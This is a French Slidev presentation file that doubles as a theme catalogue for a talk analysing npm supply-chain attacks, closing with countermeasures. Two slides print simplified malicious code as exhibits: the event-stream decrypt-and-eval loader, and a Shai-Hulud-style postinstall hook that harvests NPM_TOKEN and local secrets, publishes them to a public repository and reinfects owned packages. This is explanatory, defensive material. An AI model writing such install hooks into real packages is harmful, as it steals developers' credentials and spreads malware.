---
theme: ./theme
title: Catalogue du thème Dossier
layout: cover
meta:
  Lieu: registry.npmjs.org
  Heure: 08/09/2025 · 13:16 UTC
  Pièce: '001'
themeConfig:
  dossier: Dossier 0908
  speaker: Théo Gianella
  org: Zenika
  event: '[Conférence]'
  city: '[Ville]'
  date: '[Date du talk]'
  parts: [Contexte, Patient zéro, Propagation, Défense]
  defenses: [Mainteneurs, GitHub, Registres, Package managers, Devs]
  platforms: [GitHub, npm]
transition: slide-left
mdc: true
---

# node_modules

analyse d’une scène de crime

<!--
Layout `cover` avec meta { libellé: valeur }, affiché en bas à droite à la place du readout.
-->

---
layout: video
src: /intro.mp4
advance: true
---

<!--
Layout `video`. Props : src (fichier dans public/), poster, muted, loop, advance (passe à la slide suivante à la fin), fit (cover | contain).
La vidéo démarre au début quand la slide s'affiche et ne joue que dans la vue public (pas dans la vue présentateur).
Ce fichier n'existe pas encore : la slide reste noire.
-->

---
layout: scene-shot
image: /photos/intro-email.jpg
place: Boîte de réception
time: 08/09/2025
credit: 'Photo : Mohammad Rahmani / Unsplash'
transition: fade
---

<!--
Layout `scene-shot`, plan plein écran en noir et blanc pour une séquence d'ouverture façon série policière. Props : image (dans public/, ou à la place le slot `::screen::`, zoomé comme la photo, par exemple pour PublishLog), place et time (incrustation en bas à gauche, qui apparaît peu après la slide), credit, zoom (in | out : zoom lent pendant que la slide est affichée), focus (point central du cadrage et du zoom, object-position CSS). Le slot par défaut se place librement sur la photo.
-->

---
layout: cover
---

# Anatomie d’une attaque de la chaîne d’approvisionnement npm

Retracer les compromissions de 2025 jusqu’à leur source

<!--
Layout `cover` (variante labo).
Props : status, kicker, speakerLabel (kicker de la plaque orateur, Enquêteur par défaut), speaker, org, meta { libellé: valeur } (en bas à droite, à la place du readout), minutiae (true | false | liste de libellés), readout (texte | false), readoutValue, readoutRatio.
-->

---
layout: investigator
fields:
  Unité: Zenika
  Fonction: '[rôle]'
  Affaire en cours: '[projet en cours]'
---

# Théo Gianella

<!--
Layout `investigator`, présentation de l’orateur avec son portrait. Props : status, kicker, fields { libellé: valeur }, photo (chemin dans public/).
-->

---
status: Contexte
---

# Ce qu’on installe vraiment

- Un `npm install` exécute du code de **centaines** de mainteneurs
- La plupart sont des dépendances transitives
  - jamais déclarées dans `package.json`
  - rarement auditées
- Un seul jeton volé suffit à <mark>publier une version malveillante</mark>

<!--
Layout `default`. Props : status.
Listes à puces, listes numérotées, `code` en ligne, **gras** et <mark> sont stylés.
-->

---
layout: section
part: 2
---

# L’e-mail d’hameçonnage

<!--
Layout `section`. Props : part (index dans themeConfig.parts : grand numéro, étape courante de l’agenda), kicker, status.
La barre d'agenda vient de themeConfig.parts.
-->

---
layout: fact
status: Exposition
kicker: Téléchargements hebdomadaires exposés
value: 2,6 Md
---

sur 18 paquets, à partir d’un seul jeton volé

::aside::

<Readout label="Paquets" value="18" :ratio="1" />
<Readout label="Mainteneurs" value="1" :segments="1" />
<Readout label="Délai de détection" value="~2 h" :segments="3" />

<!--
Layout `fact`. Props : value, kicker, status.
Slot par défaut : contexte. Slot ::aside:: : colonne de droite.
-->

---
layout: statement
status: Note d’analyse
---

Vous n’installez pas un paquet. Vous installez tous ceux qui peuvent le publier.

<!--
Layout `statement`. Props : kicker, source, status.
-->

---
layout: two-cols
status: Profil du sujet
cols: 760px 1fr
---

# L’attaquant n’a jamais touché au dépôt

::left::

<SubjectCard
  header="Sujet 01 / 18"
  name="debug"
  meta="v4.4.2 — 8 sept. 2025"
  :fields="[
    { label: 'Source', value: 'jeton npm (hameçonné)', alert: true },
    { label: 'Tag GitHub', value: 'aucun', alert: true },
    { label: 'Charge utile', value: 'détournement de portefeuilles' },
  ]"
/>

::right::

<Verdict
  label="Provenance de la version"
  value="Aucune correspondance"
  :size="104"
  caption="Analyse terminée · 1 284 commits · 0 résultat"
>

Le tarball publié ne correspond à aucun commit, tag ou build CI. Seul le registre le savait.

</Verdict>

<!--
Layout `two-cols`. Props : cols (colonnes CSS grid), align, status.
Slot par défaut : titre. Slots ::left:: et ::right::.
Composants : <SubjectCard> (prop compact pour une version réduite, logo : URL d’une image pour la case avatar, ex. /logos/chalk.png), <Verdict>.
-->

---
layout: case
status: Affaire 03
reveal: 1
kicker: Affaire 03 · novembre 2018
subject:
  header: Pièce 01 · paquet npm
  flag: ■ Piégé
  name: event-stream
  meta: v3.3.6 · sept. 2018
  fields:
    - { label: Téléchargements, value: 2 M / semaine }
    - { label: Mainteneur, value: dominictarr → right9ctrl }
    - { label: Dépendance piégée, value: flatmap-stream@0.1.1, alert: true }
modus:
  - { label: Vecteur, value: Reprise de la maintenance par ingénierie sociale, at: '05.09' }
  - { label: Charge, value: Code chiffré dans une dépendance indirecte, at: ['09.09', '05.10'] }
  - { label: Cible, value: Les portefeuilles Bitcoin de l’app Copay, at: '05.10' }
  - { label: Détection, value: 'Par hasard, après 2 mois et demi', alert: true, at: ['20.11', '26.11'] }
timeline:
  - { date: '05.09', label: Accès obtenu }
  - { date: '09.09', label: Dépendance ajoutée }
  - { date: '05.10', label: Charge publiée, hot: true }
  - { date: '20.11', label: Issue n° 116 }
  - { date: '26.11', label: Retrait }
---

# event-stream

Un mainteneur épuisé confie son paquet à un inconnu

::window-1::

<AppWindow title="Vecteur">
  <div class="w-[1000px] h-[480px]" style="background: #dce4ee" />
</AppWindow>

::window-2::

<AppWindow title="flatmap-stream/index.min.js">

```js
const key = process.env.npm_package_description
const code = decrypt(require('./test/data'), key)
if (code) eval(code)
```

</AppWindow>

::window-4::

<AppWindow title="Issue n° 116">
  <div class="w-[1200px] h-[560px]" style="background: var(--hud-muted)" />
</AppWindow>

<!--
Layout `case` : une attaque sur une slide. Props : kicker, subject (props de <SubjectCard>, affichée compacte, logo compris),
modusLabel (« Mode opératoire » par défaut), modus [{ label, value, alert, at, clicks }], timeline [{ date, label, hot }], cols, status, reveal.
reveal (numéro de clic) : la carte, la frise et le titre de la colonne de droite apparaissent à ce clic ; puis chaque ligne
de modus est une étape : un clic met en avant ses dates sur la frise (at : une date ou une liste, écrites comme dans timeline,
entre guillemets), un clic ouvre sa fenêtre (slot ::window-n::, n = rang de la ligne à partir de 1), un clic la ferme et affiche la ligne.
Sans at ou sans fenêtre, l'étape saute ce clic. Sans reveal, tout est affiché d'emblée.
clicks : garde les fenêtres de la ligne ouvertes pour autant de clics en plus (un nombre par fenêtre, ou un seul pour toutes) ;
un composant dans la fenêtre récupère le clic d'ouverture avec inject('case-window-at') et compte ses étapes à partir de là.
Slot par défaut : titre et sous-titre. Slots ::subject:: et ::modus:: : remplacent la carte et la colonne de droite.
Slot ::windows:: : calque libre au-dessus du corps de la slide pour d'autres fenêtres, empilées au centre, avec des clics absolus
après les étapes. Ex. <AppWindow v-click="[13, 14]" class="open-center">.
-->

---
status: Casier judiciaire
---

# Ce n’est pas un premier délit

<Timeline
  class="my-auto"
  highlight="3 incidents en 3 semaines"
  :events="[
    { date: '2018', name: 'event-stream', text: 'Vol de bitcoins via un nouveau mainteneur' },
    { date: '2021', name: 'ua-parser-js', text: 'Compte piraté, mineur de cryptomonnaie' },
    { date: '2022', name: 'node-ipc', text: 'Le mainteneur sabote son propre paquet' },
    { date: 'août 2025', name: 'nx', text: 'Jetons volés, secrets publiés sur GitHub', hot: true },
    { date: 'sept. 2025', name: 'chalk, debug', text: 'Mainteneur hameçonné, vol de portefeuilles', hot: true },
    { date: 'sept. 2025', name: 'Shai-Hulud', text: 'Ver auto-réplicant, 500+ paquets', hot: true },
  ]"
/>

<!--
Composant <Timeline>. Props : events [{ date, name, text, hot }], highlight.
-->

---
status: Pièce à conviction C
---

# Un postinstall, quatre délits

<CodeEvidence :notes="{
  2: 'S’exécute à chaque installation',
  6: 'Récolte les secrets locaux',
  7: 'Les publie dans un dépôt public',
  8: 'Réinfecte tous vos paquets',
}">

```js [bundle.js · désobfusqué]
// package.json
"postinstall": "node bundle.js"

// bundle.js
const token = process.env.NPM_TOKEN
const loot = await scanSecrets(homedir())
await gh.createRepo("Shai-Hulud", loot)
for (const pkg of await npm.owned(token))
  await publishInfected(pkg)
```

</CodeEvidence>

<!--
Composant <CodeEvidence>. Props : notes { numéro de ligne: texte }, codeWidth, lineHeight, lineNumbers.
Le titre du bloc de code ([bundle.js]) devient la barre du panneau.
-->

---
status: Chaîne de possession
---

# Vous n’avez jamais demandé debug

<DepGraph
  class="my-auto"
  :nodes="[
    { id: 'app', label: 'mon-app' },
    { id: 'express' },
    { id: 'eslint' },
    { id: 'jest' },
    { id: 'body-parser', y: 0.12 },
    { id: 'send', y: 0.35 },
    { id: 'babel', label: '@babel/core', y: 0.83 },
    { id: 'debug', version: '4.4.2', flagged: true },
  ]"
  :edges="[
    'app>express', 'app>eslint', 'app>jest',
    'express>body-parser', 'express>send', 'jest>babel',
    'body-parser>debug', 'eslint>debug', 'babel>debug',
  ]"
/>

<div class="flex gap-24">
  <Readout label="Déclaré" value="0" accent />
  <Readout label="Chemins trouvés" value="3" accent />
  <Readout label="Profondeur max" value="3" accent />
</div>

<!--
Composant <DepGraph>. Props : nodes [{ id, label, version, flagged, col, y }], edges ('a>b' ou ['a', 'b']), width, height, nodeWidth, nodeHeight, flagLabel.
Les arêtes qui mènent à un nœud `flagged` sont en orange.
-->

---
status: Protocole
---

# Contre-mesures

<Protocol id="P-01" code="minimumReleaseAge: 1440">Attendre avant d’installer une nouvelle version</Protocol>
<Protocol id="P-02" code="onlyBuiltDependencies: [...]">Bloquer les scripts d’installation</Protocol>
<Protocol id="P-03" code="pnpm install --frozen-lockfile">Installer exactement le lockfile</Protocol>
<Protocol id="P-04" code="trusted publishing (OIDC)">Publier sans jeton de longue durée</Protocol>

<!--
Composant <Protocol>. Props : id, code (ou slot #code).
-->

---
layout: defense
actor: 2
---

# GitHub

<v-clicks>

- **Des permissions minimales**
- **Épingler les actions par commit**
- **Isoler le cache de la release**

</v-clicks>

<!--
Layout `defense`. Props : actor (index dans la série), series (clé de themeConfig qui liste les acteurs, defenses par défaut),
label (préfixe du kicker, Défense par défaut), kicker, status (Protocole par défaut).
La chaîne d'acteurs en haut à droite vient de cette clé ; ex. series: platforms, label: Plateforme.
Chaque élément de liste est une mesure en gras, numérotée M-01, M-02…, centrée sous le titre. Une ligne d'explication sous le gras est possible. Entourer la liste de <v-clicks> pour l'échelonner.
-->

---
layout: cards
status: Plateformes
actor: 1
cards:
  - { date: Août 2025, label: Premier changement }
  - { date: Nov. 2025, label: Deuxième changement, img: /photos/logicielle-acces.jpg }
  - { date: Déc. 2025, label: Troisième changement }
  - { date: 2026, label: Quatrième changement }
  - { date: 2026, label: Cinquième changement }
---

# GitHub

::window-1::

<AppWindow title="github.blog · changelog" class="w-[1200px]">
  <img src="/photos/logicielle-acces.jpg" class="block w-full h-[600px] object-cover" />
</AppWindow>

::window-2::

<AppWindow title="github.blog · changelog" class="w-[1200px]">
  <img src="/photos/logicielle-acces.jpg" class="block w-full h-[600px] object-cover" />
</AppWindow>

<!--
Layout `cards`. Props : cards [{ label, date, img, position, clicks }], actor, series (platforms par défaut),
label (préfixe du kicker, Plateforme par défaut), kicker, status, reveal (1 par défaut, false : tout affiché).
2 à 5 cartes sur deux rangées : deux par rangée jusqu'à quatre (plus grandes), 3 + 2 pour cinq.
Slot ::window-n:: : la carte n est d'abord présentée dans cette fenêtre (un clic l'ouvre, le suivant
la fait voler sur sa carte). Sans fenêtre, la carte apparaît sur un clic.
Plus de fenêtres pour la carte n dans ::window-n-2::, ::window-n-3::…, chacune ouverte au clic qui ferme la précédente ;
la dernière vole sur la carte. `clicks` (un nombre, ou un par fenêtre) garde les fenêtres ouvertes pour autant de clics de plus, pour un schéma par étapes
(inject('case-window-at'), comme dans le layout case ; ex. <TokenLifespan />). Slot ::thumb-n:: : la vignette de la carte n.
-->

---
status: Boîte à outils
---

# Petits composants

<div class="grid grid-cols-2 gap-x-20">
<div>

<Kicker>Kicker</Kicker>

Étiquettes : <Tag>Malveillant</Tag> <Tag variant="ink">■ Signalé</Tag> <Tag variant="outline">P-01</Tag>

Caviardage : `NPM_TOKEN=`<Redact>npm_9fKx2mQ7</Redact>

<Readout label="Jauge" value="12 / 18" :segments="12" />

<Stamp :rotate="4" :size="48">Compromis</Stamp>

</div>
<div>

```ts [exemple.ts]
// Les blocs de code ont un panneau blanc
const pkg = await fetch(url)
```

| Paquet | Version | Verdict |
| --- | --- | --- |
| chalk | 5.6.1 | <Tag>Malveillant</Tag> |
| debug | 4.4.2 | <Tag>Malveillant</Tag> |

</div>
</div>

<!--
<Kicker>, <Tag variant="accent|ink|outline">, <Redact reveal?>, <Readout>, <Segments>, <Stamp rotate size>, <HudCorners lock?>, <Fingerprint size tone scan minutiae loop?>, <Crosshair>.
Écran d’attente de la couverture : <Fingerprint loop> (balayage, marqueurs) et <HudCorners lock> (verrouillage du cadre), chacun sur son propre cycle.
Classes utilitaires : hud-label, hud-accent, hud-muted, hud-head, hud-mono.
Transition : classe open-center sur un élément v-click encadré (carte, image), il s’ouvre depuis le centre comme une fenêtre et se referme à l’inverse. Variable --enter-delay sur l’élément : retarde son apparition (par exemple pour laisser un autre élément se refermer d’abord).
-->

---
status: Pièces à conviction
---

# Relier deux pièces

<div class="flex-1 flex flex-col justify-center gap-[120px]">
  <div class="flex justify-end">
    <SubjectCard compact class="source w-[560px]" name="Pièce A" meta="source" />
  </div>
  <div class="flex justify-start">
    <SubjectCard compact class="cible after-draw w-[560px]" v-click="1" name="Pièce B" meta="cible" />
  </div>
  <Connector v-click="1" from=".source" to=".cible" />
</div>

<!--
Composant <Connector>. Props : from, to (sélecteurs CSS dans la slide), fromSide, toSide (top|bottom|left|right, bas → haut par défaut), color, width, duration (ms), delay (ms, attente avant le tracé).
Ligne à angles droits, en surimpression : elle ne prend pas de place dans la mise en page. Côtés sur le même axe : deux coudes à mi-chemin ; sur des axes différents (bas → gauche…) : un seul coude.
Avec v-click, la ligne se dessine de from vers to. Classe after-draw : l'élément se dévoile de haut en bas au même clic, une fois la ligne dessinée (délai réglable par --after-draw-delay).
-->

---
layout: end
contacts:
  Slides: exemple.fr/supply-chain
  Contact: '@pseudo'
---

# Affaire classée ?

Questions, pistes et contre-arguments bienvenus

<!--
Layout `end`. Props : kicker, stamp, contacts { libellé: valeur }, qrcodes [{ label, url, img }], status.
-->

---
layout: end
qrcodes:
  - { label: Votre avis, url: exemple.fr/avis }
  - { label: Site, url: exemple.fr }
---

# Merci

Questions, pistes et contre-arguments bienvenus

<!--
Layout `end` avec qrcodes : de grands QR codes au centre, sous le titre réduit, à la place de l'empreinte et du tampon ; img est l'image du code
dans public/ (sans img, un carré de remplacement).
-->
